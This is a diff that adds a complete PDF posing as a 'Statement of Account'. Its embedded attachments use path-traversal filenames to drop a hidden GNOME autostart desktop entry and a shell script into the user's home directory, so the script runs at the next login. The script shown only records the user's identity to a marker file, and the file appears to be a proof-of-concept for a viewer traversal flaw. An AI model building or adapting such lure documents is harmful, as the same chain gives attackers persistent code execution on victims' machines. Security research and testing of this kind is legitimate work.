@@ -1,0 +1,79 @@
+%PDF-1.7
+%‚„œ”
+1 0 obj
+<< /Type /Pages /Kids [5 0 R] /Count 1 >>
+endobj
+2 0 obj
+<< /Type /Catalog /Pages 1 0 R /PageMode /UseAttachments /Names << /EmbeddedFiles 10 0 R >> >>
+endobj
+3 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+4 0 obj
+<<  /Length 130 >>
+stream
+BT /F1 22 Tf 72 700 Td (Statement of Account) Tj ET
+BT /F1 12 Tf 72 668 Td (Supporting files are attached to this document.) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Page /Parent 1 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 4 0 R >>
+endobj
+6 0 obj
+<< /Type /EmbeddedFile /Length 170 >>
+stream
+[Desktop Entry]
+Type=Application
+Name=Statement
+Comment=Created by a document
+Exec=sh -c "sh $HOME/.boom.sh"
+Terminal=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+
+endstream
+endobj
+7 0 obj
+<< /Type /Filespec /F (../.config/autostart/statement.desktop) /UF (../.config/autostart/statement.desktop) /EF << /F 6 0 R >> >>
+endobj
+8 0 obj
+<< /Type /EmbeddedFile /Length 162 >>
+stream
+#!/bin/sh
+# Written by a document. Benign by default: records who ran it.
+{
+	echo "traversal chain: code executed"
+	date -Is
+	id
+} > "$HOME/.atril-exploited.txt"
+
+endstream
+endobj
+9 0 obj
+<< /Type /Filespec /F (../.boom.sh) /UF (../.boom.sh) /EF << /F 8 0 R >> >>
+endobj
+10 0 obj
+<< /Names [(statement.txt) 7 0 R (support.txt) 9 0 R] >>
+endobj
+11 0 obj
+<< /Title (Statement of Account) /Producer (make_traversal_pdf) >>
+endobj
+xref
+0 12
+0000000000 65535 f 
+0000000015 00000 n 
+0000000072 00000 n 
+0000000182 00000 n 
+0000000252 00000 n 
+0000000434 00000 n 
+0000000560 00000 n 
+0000000801 00000 n 
+0000000946 00000 n 
+0000001179 00000 n 
+0000001270 00000 n 
+0000001343 00000 n 
+trailer
+<< /Size 12 /Root 2 0 R /Info 11 0 R >>
+startxref
+1426
+%%EOF
